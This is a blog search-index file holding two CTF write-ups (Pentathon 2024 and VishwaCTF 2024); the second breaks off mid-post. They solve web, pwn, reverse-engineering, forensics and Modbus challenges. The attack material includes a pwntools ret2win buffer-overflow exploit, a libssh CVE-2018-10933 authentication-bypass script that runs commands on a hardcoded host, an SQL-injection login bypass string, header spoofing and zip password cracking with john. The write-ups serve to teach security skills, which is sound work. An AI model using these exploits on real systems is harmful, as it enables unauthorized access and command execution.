<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CTF WriteUp: Pentathon 2024</title>
      <link href="/2024/03/19/post8/Pentathon_2024/"/>
      <url>/2024/03/19/post8/Pentathon_2024/</url>
      
        <content type="html"><![CDATA[<p><img src="/imgs/post8/front.png" alt="front.png"></p><p>Throughout the past weekend, I participated in the Pentathon2024, a beginner-friendly Capture The Flag event. Throughout the competition, I successfully navigated through some challenges, these are those challenges writeups that i managed to solve.</p><p>All challenges can be found <a href="https://github.com/durge5h/CTFs/tree/main/Competition/Pentathon-2024">here</a></p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Health-care"><a href="#Health-care" class="headerlink" title="Health care"></a>Health care</h3><h4 id="Descripttion"><a href="#Descripttion" class="headerlink" title="Descripttion"></a>Descripttion</h4><blockquote><p>You finally come across a unique health care application. Everyone has tried their best to get info from it, but no one has been able to get anything useful. It allways makes silly excuses. Can you help us?</p></blockquote><p>this challenge is quite similar to the last ctf i.e. VishwaCTF-2024’s <a href="https://github.com/peace-ranger/CTF-WriteUps/blob/main/2024/VishwaCTF%202024/h34d3rs.md">h34d3rs</a>, where we have to to perform host header injection according to the response from server.</p><p><img src="/imgs/post8/web/health_care1.png" alt="health_care1.png"></p><p>using username and password as admin i loged in to website where we had flag section in right side of portal, after clicking that it gives this err</p><p><img src="/imgs/post8/web/health_care2.png" alt="health_care2.png"></p><p> after capturing request through burp suite it shows</p><p><img src="/imgs/post8/web/health_care3.png" alt="health_care3.png"></p><p>as we can see its says only pentabrowser is allowed or else it will redirect to home page, we can do it by using <strong>User-Agent: pentabrowser</strong></p><p><img src="/imgs/post8/web/health_care3.1.png" alt="health_care3.1.png"></p><p>the next response it gives is  <strong>Acess denied, You are not coming from our local server</strong>, so for that we can use header <strong>Referer</strong> with value <strong><a href="http://localhost/">http://localhost/</a></strong></p><p><img src="/imgs/post8/web/health_care4.png" alt="health_care4.png"></p><p><strong>Access denied, Please use a proxy, your request should originate from 169.172.18.9</strong>, here <strong>X-Forwarded-For</strong> header worked for me</p><p><img src="/imgs/post8/web/health_care5.png" alt="health_care5.png"></p><p>the next response it gives is <strong>Your request should stay in proxy server for 10 seconds</strong> it took me some time to find the working header that is <strong>[Age][<a href="https://developer.mozilla.org/en-US/docs/imgs/post8/web/HTTP/Headers/Age]">https://developer.mozilla.org/en-US/docs/imgs/post8/web/HTTP/Headers/Age]</a></strong></p><p><img src="/imgs/post8/web/health_care5.1.png" alt="health_care5.1.png"></p><p>after adding all those headers in request sequentially gives me the flag</p><p><img src="/imgs/post8/web/health_care6.png" alt="health_care6.png"></p><h5 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">solve.py</span><br></pre></td></tr></table></figure><h3 id="USB-Ultra-Secure-Bank"><a href="#USB-Ultra-Secure-Bank" class="headerlink" title="USB - Ultra Secure Bank"></a>USB - Ultra Secure Bank</h3><h4 id="Descripttion-1"><a href="#Descripttion-1" class="headerlink" title="Descripttion"></a>Descripttion</h4><blockquote><p>Ultra Secure Bank was famous for being super safe — so safe that no one could break in. So the bank challenged the whole world to try to break in. Can you find your way into the most secure account and save the day? Find a way past its strong security? Show your skills and conquer the Ultra Secure Bank!</p></blockquote><p>will update when ctf platform will re-live …..</p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h3><h4 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h4><blockquote><p>I found an exposed service on a power grid machine. I heard that buffer overflow is one of the most common memory corruption bugs. Maybe it might work here that</p></blockquote><h5 id="Main-func"><a href="#Main-func" class="headerlink" title="Main func"></a>Main func</h5><p><img src="/imgs/post8/pwn/overflow1.png" alt="overflow1.png"></p><p>if you see line 11 <strong>gets</strong> function being used that means its clearly vulnerable bof as no-bound checking, so we can leverage it for overwriting <strong>local_14</strong> var  as flag function is being called if and only if <strong>local_14 !&#x3D; 0</strong> where flag func print the flag.</p><h5 id="Flag-func"><a href="#Flag-func" class="headerlink" title="Flag func"></a>Flag func</h5><p><img src="/imgs/post8/pwn/overflow2.png" alt="overflow2.png"></p><h5 id="Solve-1"><a href="#Solve-1" class="headerlink" title="Solve"></a>Solve</h5><p><img src="/imgs/post8/pwn/overflow-solve.gif" alt="overflow-solve.gif"></p><h3 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h3><h4 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h4><blockquote><p>Walter has encountered a buffer overflow in an exposed service but he is unable to exploit it. Help him out.</p></blockquote><h5 id="Main-func-1"><a href="#Main-func-1" class="headerlink" title="Main func"></a>Main func</h5><p><img src="/imgs/post8/pwn/bof1.png" alt="bof1.png"></p><p>function on line no. 10 being used is most probably <strong>scanf</strong> function and same as before no bound checking where the first arg i.e. is <strong>%s</strong> format specifier and second one is user input.</p><h5 id="secretFunction-func"><a href="#secretFunction-func" class="headerlink" title="secretFunction func"></a>secretFunction func</h5><p><img src="/imgs/post8/pwn/bof2.png" alt="bof2.png"></p><p>this particular function is printing the flag.</p><p>okay, pretty clear it is. its just typical <a href="https://sf4ult.github.io/2023/02/12/post2/pwn2own/#Gaining-root-privilege-02">ret2win</a> challenge </p><h5 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">context.binary = elf</span><br><span class="line"></span><br><span class="line">gdbscript=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:  <span class="comment"># Set GDBscript below</span></span><br><span class="line">        <span class="keyword">return</span> gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">elif</span> args.REMOTE:  <span class="comment"># (&#x27;server&#x27;, &#x27;port&#x27;)</span></span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># Run locally</span></span><br><span class="line">        <span class="keyword">return</span> process([elf.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    r = conn()</span><br><span class="line"></span><br><span class="line">    padding = cyclic(<span class="number">40</span>)</span><br><span class="line">    win = elf.symbols[<span class="string">&#x27;secretFunction&#x27;</span>]</span><br><span class="line">    payload = padding + pack(win)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="REV"><a href="#REV" class="headerlink" title="REV"></a>REV</h2><h3 id="byte-by-byte"><a href="#byte-by-byte" class="headerlink" title="byte by byte"></a>byte by byte</h3><h4 id="Description-2"><a href="#Description-2" class="headerlink" title="Description"></a>Description</h4><blockquote><p>You’ve been hired as a cybersecurity consultant to test the defenses of a major corporation’s secure network. Your objective is to gain access to their encrypted data vault, which contains sensitive information and trade secrets. All of these have been stored behind a password system. Can you crack the code and gain access to the corporate vault?</p></blockquote><h5 id="Main-func-2"><a href="#Main-func-2" class="headerlink" title="Main func"></a>Main func</h5><p><img src="/imgs/post8/rev/byte1.png" alt="byte1.png"></p><p>scattered flag , we can do it either manually or using angr</p><h5 id="Solve-2"><a href="#Solve-2" class="headerlink" title="Solve"></a>Solve</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> re </span><br><span class="line"></span><br><span class="line">project = angr.Project(<span class="string">&quot;./condition&quot;</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@project.hook(<span class="params"><span class="number">0x401584</span></span>)  </span><span class="comment"># Target address</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_flag</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;VALID INPUT:&quot;</span>, state.posix.dumps(<span class="number">0</span>))</span><br><span class="line">    project.terminate_execution()</span><br><span class="line"></span><br><span class="line">project.execute()</span><br></pre></td></tr></table></figure><p><img src="/imgs/post8/rev/bytebybyte-solve.png" alt="bytebybyte-solve.png"></p><h2 id="Post-CTF"><a href="#Post-CTF" class="headerlink" title="Post CTF"></a>Post CTF</h2><h2 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h2><h3 id="Echoes-of-the-Unseen"><a href="#Echoes-of-the-Unseen" class="headerlink" title="Echoes of the Unseen"></a>Echoes of the Unseen</h3><h4 id="Description-3"><a href="#Description-3" class="headerlink" title="Description"></a>Description</h4><blockquote><p>Within the digital void, a silent challenge beckons. No maps, no signs only intuition guides. Will you decode the whispers of light and shadow, or succumb to obscurity? Journey forth, unveil the unseen.</p></blockquote><p>A file png file given, that seems to be corrupted </p><p><img src="/imgs/post8/forensic/epic_chl1.png" alt="epic_chl1.png"></p><p>most probably author has done some alternation of structure of png file</p><p>looking its hexdump using <strong>ghex</strong> i got to know that the veryfirst byte has tempered to <strong>98</strong> instead of <strong>89</strong> i amended it check it again </p><p><img src="/imgs/post8/forensic/epic_chl3.png" alt="epic_chl3.png"></p><p>it shows <strong>illegal (unless recently approved) unknown, public chunk</strong> that is <strong>IFAT</strong></p><p><img src="/imgs/post8/forensic/epic_chl2.png" alt="epic_chl2.png"></p><p>so if you aware of structure of png it has no chunk named IFAT that suppose to be IDAT. We can convert it either manually or using <strong>dd</strong></p><p><img src="/imgs/post8/forensic/epic_chl5.png" alt="epic_chl5.png"></p><p>after changing forged chunk to original one</p><p><img src="/imgs/post8/forensic/epic_chl6.png" alt="epic_chl6.png"></p><p>again <strong>illegal (unless recently approved) unknown, public chunk</strong> that is <strong>ICAT</strong>, lets change it </p><p><img src="/imgs/post8/forensic/epic_chl7.png" alt="epic_chl7.png"></p><p>now only left with removing extra dat after <strong>IEND</strong> chunk lets do it</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">find_iend</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        data = file.read()</span><br><span class="line">        iend_offset = data.rfind(<span class="string">b&#x27;IEND&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> iend_offset + <span class="built_in">len</span>(<span class="string">b&#x27;IEND&#x27;</span>) + <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_extra_data</span>(<span class="params">file_path, output_path</span>):</span><br><span class="line">    iend_offset = find_iend(file_path)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> input_file:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> op:</span><br><span class="line">            op.write(input_file.read(iend_offset))</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;tmp.png&#x27;</span></span><br><span class="line">op = <span class="string">&#x27;new_file.png&#x27;</span></span><br><span class="line">remove_extra_data(ip, op)</span><br></pre></td></tr></table></figure><blockquote><p>you don’t have to make your life difficult, can just do manually. its just ‘cause i want problem i dont want peace :p</p></blockquote><p>we got the final output as </p><p><img src="/imgs/post8/forensic/recovered_png.png" alt="recovered_png.png"></p><p>its not flag obviously, something to do with alpha layer. After trying <strong>GIMP</strong> and some LSB stegno tools i didn’t get the desired result, after long try zsteg did the magic.</p><p><img src="/imgs/post8/forensic/epic_chl_flag.png" alt="epic_chl_flag.png"></p><h3 id="Data-Divergence"><a href="#Data-Divergence" class="headerlink" title="Data Divergence"></a>Data Divergence</h3><h4 id="Description-4"><a href="#Description-4" class="headerlink" title="Description"></a>Description</h4><blockquote><p>Delve deep into a labyrinthine digital landscape to uncover a secret file.</p></blockquote><p>a file <strong>chall.dat</strong> is given, trying to figure it out shows that</p><p><img src="/imgs/post8/forensic/data_dievergence.png" alt="data_dievergence.png"></p><p>its a zip file and has extra  17168 bytes at the beginnig of the file moreover its encrypted.</p><p>so lets first delete the extra bytes from it </p><p><img src="/imgs/post8/forensic/data_dievergence2.png" alt="data_dievergence2.png"></p><p>so its normal zip now and we can unzip it using password, as we dont have one we have to brute force it, i am used john here</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─$ zip2john output.zip &gt; chall.hash </span><br><span class="line">ver 2.0 output.zip/flag.gif PKZIP Encr: cmplen=46394, decmplen=46618, crc=37DB16FA ts=9739 cs=37db <span class="built_in">type</span>=8</span><br><span class="line">                                                                      </span><br><span class="line">┌──(zr0x㉿pwn3r)-[/tmp]</span><br><span class="line">└─$ john chall.hash --wordlist=/tmp/rockyou.txt</span><br></pre></td></tr></table></figure><p>and this was the flag file </p><p><img src="/imgs/post8/forensic/data_divergence_flag.gif" alt="data_divergence_flag.gif"></p><h2 id="OT-Operational-Technology-Hardware"><a href="#OT-Operational-Technology-Hardware" class="headerlink" title="OT(Operational Technology)&#x2F;Hardware"></a>OT(Operational Technology)&#x2F;Hardware</h2><p>This category of challenge was new to me as i never tried to solve Hardware challenges, i solved these two following challenges after reading other participants writeups.</p><h3 id="M0dBu5"><a href="#M0dBu5" class="headerlink" title="M0dBu5"></a>M0dBu5</h3><h4 id="Description-5"><a href="#Description-5" class="headerlink" title="Description"></a>Description</h4><blockquote><p>We intercepted a communication from a Modbus master to a slave on the RS485 bus as given below. Your goal, is to craft a response packet as the slave with 73(decimal) as slave data. Master requirements are 05-02-00-00-00-01-85-BD. Flag format: flag{XX-XX-XX-XX-XX-XX} or flag{XX-XX-XX-XX-XX-XX-XX}</p></blockquote><h4 id="What-is-Modbus"><a href="#What-is-Modbus" class="headerlink" title="What is Modbus"></a>What is Modbus</h4><p>So if you don’t know what modbus is like i didn’t know then, then chatGPT here.</p><p>Modbus is a communication protocol commonly used in industrial automation and control systems to exchange data between electronic devices. Modbus is simple, open, and widely adopted, making it one of the most popular protocols for connecting electronic devices in industrial environments.</p><p>There are several variants of the Modbus protocol, but the two most common are Modbus RTU (Remote Terminal Unit) and Modbus TCP (Transmission Control Protocol). Modbus RTU is a serial communication protocol that uses RS-232 or RS-485 for communication over a physical medium, while Modbus TCP is an Ethernet-based protocol that utilizes TCP&#x2F;IP for communication over Ethernet networks.</p><p>Modbus operates on a master-slave architecture, where one device (the master) initiates communication and commands, and one or more devices (the slaves) respond to those commands. It supports various data types, including digital inputs&#x2F;outputs, analog inputs&#x2F;outputs, and registers for storing numerical data.</p><p>for more info check this <a href="https://camatsystem.com/wp-content/uploads/2015/12/Modbus-manual-TD80.pdf">PDF</a></p><p>So, after reading this and description given for the challenge its clear that challenge is about Modbus RTU RS-485  and you may infer now is that we have to craft a response packet to the modbus master following this Master requirements,<br><strong>05-02-00-00-00-01-85-BD</strong></p><p>where according to <a href="https://camatsystem.com/wp-content/uploads/2015/12/Modbus-manual-TD80.pdf#MAPPING%20ULYSCOM%20MODBUS_ed04.indd%3A.14915">this</a> reference from above PDF.</p><p><img src="/imgs/post8/ot/modbus1.png" alt="modbus1.png"></p><ul><li>Slave Address: 05</li><li>Function Code: 02 , here Read Discrete Inputs</li><li>Starting register: 0000</li><li>quantity of discrete inputs being requested: 0001</li><li>CRC (Cyclic Redundancy Check): 8C 3E (CRC calculated based on the packet content)</li></ul><p>where,</p><p>Slave address is a unique identifier assigned to each slave device on the network. The slave address determines which slave device will respond to a specific request sent by the master device. The slave address is typically an 8-bit value ranging from 1 to 247. In a Modbus network, any valid slave address can be used, but it must match the address configured on the slave device being addressed.</p><p>Function code specifies the type of operation or action that the Modbus slave device should perform in response to a request from the Modbus master device. Each function code corresponds to a specific type of operation, such as reading data from the slave device, writing data to the slave device, or performing control actions.</p><p>“00-00” indicates the starting address of the discrete inputs being requested. In Modbus, discrete inputs are typically addressed starting from 0000, so “00-00” represents the starting address 0000.</p><p>“00-01” indicates the quantity of discrete inputs being requested. In this case, “00-01” represents a request to read one discrete input.</p><p>The CRC (Cyclic Redundancy Check) in Modbus communication is a two-byte field used for error checking to ensure the integrity of the data being transmitted. It is calculated based on the contents of the entire message, excluding the starting colon (:) and ending CR-LF (Carriage Return-Line Feed) characters in the Modbus message frame.<br>if you are interested how CRC generated then,</p><p><img src="/imgs/post8/ot/modbus2.png" alt="modbus2.png"></p><p>so again taking reference from above <a href="https://camatsystem.com/wp-content/uploads/2015/12/Modbus-manual-TD80.pdf#MAPPING%20ULYSCOM%20MODBUS_ed04.indd%3A.14915">PDF</a>, Slave response should be -</p><ul><li>Slave Address: 05</li><li>Function Code: 02 </li><li>Byte Count: 02 , represents the number of bytes of data in the response message payload, excluding the address, function code, and CRC bytes. </li><li>Requested Data: 00 49 (73 in decimal, Already given)</li><li>CRC (Cyclic Redundancy Check): 89 8E</li></ul><p>we can calculate CRC from <a href="https://npulse.net/en/online-modbus">here</a></p><p><img src="/imgs/post8/ot/modbus3.gif" alt="modbus3.gif"></p><p>so the flag will be -</p><p><code>flag&#123;05-02-02-00-49-89-8E&#125;</code></p><h3 id="L0g1c-sn1ff"><a href="#L0g1c-sn1ff" class="headerlink" title="# L0g1c_sn1ff"></a># L0g1c_sn1ff</h3><h4 id="Description-6"><a href="#Description-6" class="headerlink" title="Description"></a>Description</h4><blockquote><p>Our spy has captured a digital signal from an unknown device using a saleae logic analyzer. Your mission, should you choose to accept it, is to decode the signal and unveil the secret message embedded within. Good luck, and may your decoding skills be sharp and swift. Flag Format: flag{printable_ascii}</p></blockquote><p>we have given Saleae Logic Analyzer file that contain digital signal from an unkown device, where we have to decode the signal to get the secret message ths is flag. after reading some previous ctf challenges i came to know that we have to somehow find out the baud rate or data speed transfer rate of siginal.</p><p>i tried some time but did not able to get the correct baud rate, but later after reading writup i got to know there is automated extension for this purpose that is<br><strong>baud rate estimate</strong></p><p><img src="/imgs/post8/ot/logic_sniff1.png" alt="logic_sniff1.png"></p><p>we can get the correct baud rate i.e. </p><p><img src="/imgs/post8/ot/logic_sniff2.gif" alt="logic_sniff2.gif"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
            <tag> forensic </tag>
            
            <tag> web </tag>
            
            <tag> Hardware </tag>
            
            <tag> rev </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF WriteUp: VishwaCTF 2024</title>
      <link href="/2024/03/04/post7/vishwaCTF_2024/"/>
      <url>/2024/03/04/post7/vishwaCTF_2024/</url>
      
        <content type="html"><![CDATA[<p><img src="/imgs/post7/front.png" alt="front.png"></p><p>After long time, over this weekend i participated in a CTF - VishwaCTF-2024, it was beginner freindly CTF where i solved some challenges over there, Below is the writeup for the challenges that I managed to solve.</p><p>All challenges can be found <a href="https://github.com/Durge5h/CTFs/tree/main/Competition/VishwaCTF-2024">here</a></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Save-The-City"><a href="#Save-The-City" class="headerlink" title="Save The City"></a>Save The City</h3><h4 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h4><blockquote><p>The RAW Has Got An Input That ISIS Has Planted a Bomb Somewhere In The Pune! Fortunetly, RAW Has Infiltratrated The Internet Activity of One Suspect And They Found This Link. You Have To Find The Location ASAP!</p></blockquote><p>after opening the site i stumbled upon blank page where was nothing but just “libssh_0.8.1” so i googled exploit for this particular version where i got to know that it is vulnerable to Authentication Bypass (CVE-2018-10933) vuln and got <a href="https://jlajara.gitlab.io/libssh-bypass-vuln">this</a> page where</p><h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket()</span><br><span class="line">s.connect((<span class="string">&quot;13.234.11.113&quot;</span>,<span class="number">31133</span>))</span><br><span class="line">m = paramiko.message.Message()</span><br><span class="line">t = paramiko.transport.Transport(s)</span><br><span class="line">t.start_client()</span><br><span class="line">m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)</span><br><span class="line">t._send_message(m)</span><br><span class="line">c = t.open_session(timeout=<span class="number">5</span>)</span><br><span class="line">c.exec_command(sys.argv[<span class="number">1</span>])</span><br><span class="line">out = c.makefile(<span class="string">&quot;rb&quot;</span>,<span class="number">2048</span>)</span><br><span class="line">output = out.read()</span><br><span class="line">out.close()</span><br><span class="line"><span class="built_in">print</span> (output)</span><br></pre></td></tr></table></figure><p>after ls’ing the dir we got the flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python solve.py <span class="string">&quot;cat secret.txt/flag.txt&quot;</span></span><br></pre></td></tr></table></figure><h3 id="Trip-To-Us"><a href="#Trip-To-Us" class="headerlink" title="Trip To Us"></a>Trip To Us</h3><h4 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h4><blockquote><p>IIT kharakpur is organizing a US Industrial Visit. The cost of the registration is $1000. But as always there is an opportunity for intelligent minds. Find the hidden login and Get the flag to get yourself a free US trip ticket.</p></blockquote><p>it was typical SQLi bypass challenge, using <strong>admin” or “1”&#x3D;”1”–</strong> as username and password i did able to bypass it.</p><h3 id="They-Are-Coming"><a href="#They-Are-Coming" class="headerlink" title="They Are Coming"></a>They Are Coming</h3><h4 id="Description-2"><a href="#Description-2" class="headerlink" title="Description"></a>Description</h4><blockquote><p>Aesthetic Looking army of 128 Robots with AGI Capabilities are coming to destroy our locality!</p></blockquote><p>Nothing interesting on home page at first glance, looking at source code got a js file where some bottom portion of code caught my attention after beautifying it </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">yt = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">       <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;userRole&quot;</span>, <span class="string">&quot;admin&quot;</span>), <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;F1ag&quot;</span>, <span class="string">&quot;Open Your Eyes!&quot;</span>), <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;lastLogin&quot;</span>, <span class="string">&quot;2023-01-01T12:00:00Z&quot;</span>), <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;theme&quot;</span>, <span class="string">&quot;dark&quot;</span>), <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;language&quot;</span>, <span class="string">&quot;en_US&quot;</span>), <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;isLoggedIn&quot;</span>, <span class="string">&quot;true&quot;</span>), <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;unreadMessages&quot;</span>, <span class="string">&quot;5&quot;</span>), <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;preferredCurrency&quot;</span>, <span class="string">&quot;USD&quot;</span>);</span><br><span class="line">       <span class="keyword">return</span> <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;DivID&quot;</span>, <span class="string">&quot;205&quot;</span>), <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;Flag&quot;</span>, <span class="string">&quot;Gkul0oJKhNZ1E8nxwnMY8Ljn1KNEW9G9l+w243EQt0M4si+fhPQdxoaKkHVTGjmA&quot;</span>), <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;AppVer&quot;</span>, <span class="string">&quot;1.0&quot;</span>), (<span class="number">0</span>, vt.<span class="property">jsx</span>)(vt.<span class="property">Fragment</span>, &#123;</span><br><span class="line">           <span class="attr">children</span>: (<span class="number">0</span>, vt.<span class="property">jsxs</span>)(<span class="string">&quot;div&quot;</span>, &#123;</span><br><span class="line">               <span class="attr">className</span>: <span class="string">&quot;hint-main&quot;</span>,</span><br><span class="line">               <span class="attr">children</span>: [(<span class="number">0</span>, vt.<span class="property">jsx</span>)(<span class="string">&quot;h1&quot;</span>, &#123;</span><br><span class="line">                   <span class="attr">className</span>: <span class="string">&quot;hint&quot;</span>,</span><br><span class="line">                   <span class="attr">children</span>: <span class="string">&quot;A Courrpt AI Agent and Its Army of 128 Aesthetic Looking Robots Are Heading Towards Local Vault of the City of Dawn!&quot;</span></span><br><span class="line">               &#125;), (<span class="number">0</span>, vt.<span class="property">jsx</span>)(<span class="string">&quot;p&quot;</span>, &#123;</span><br><span class="line">                   <span class="attr">className</span>: <span class="string">&quot;hint1&quot;</span>,</span><br><span class="line">                   <span class="attr">style</span>: &#123;</span><br><span class="line">                       <span class="attr">display</span>: <span class="string">&quot;none&quot;</span></span><br><span class="line">                   &#125;,</span><br><span class="line">                   <span class="attr">children</span>: <span class="string">&quot;I have done 128 cbc tests&quot;</span></span><br><span class="line">               &#125;)]</span><br><span class="line">           &#125;)</span><br><span class="line">       &#125;)</span><br><span class="line">   &#125;,</span><br><span class="line">   bt = &#123;</span><br><span class="line">       <span class="attr">hh188</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">       <span class="attr">getKey</span>: <span class="string">&quot;/secret-location&quot;</span></span><br><span class="line">   &#125;;</span><br></pre></td></tr></table></figure><p>so as we can see here some data being stored on local storage and moreover more interesting one is <strong>Flag</strong> item that has some encrypted value</p><p>hmm, so most probably this one is a real flag that is encrypted using key? , if so which encryption standard and key?.</p><p>so about encryption algorithm we got some hints already, if you look on above code there is <strong>children</strong> key with value <strong>I have done 128 cbc tests</strong> so its most likely AES 128 CBC</p><p>and about key? so if we check <strong>robots.txt</strong> we all sorted out</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /admin</span><br><span class="line">L3NlY3JldC1sb2NhdGlvbg==</span><br><span class="line">Decryption key: th1s_1s_n0t_t5e_f1a9</span><br></pre></td></tr></table></figure><p>now we have Decryption key and cipher as well we are ready to go to this <a href="https://encode-decode.com/aes-128-cbc-encrypt-online/">site</a> and we got the flag.</p><p><img 